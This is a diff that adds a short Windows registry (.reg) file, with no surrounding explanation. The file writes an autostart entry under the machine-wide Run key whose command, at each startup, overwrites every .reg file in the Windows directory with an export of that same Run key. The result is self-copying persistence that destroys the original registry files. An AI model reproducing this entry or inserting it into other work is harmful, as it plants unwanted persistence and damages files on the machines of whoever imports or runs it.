@@ -1,0 +1,4 @@
+REGEDIT4
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\]
+@="command /c for %i in (%windir%\\*.reg) do regedit /e %i HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
+
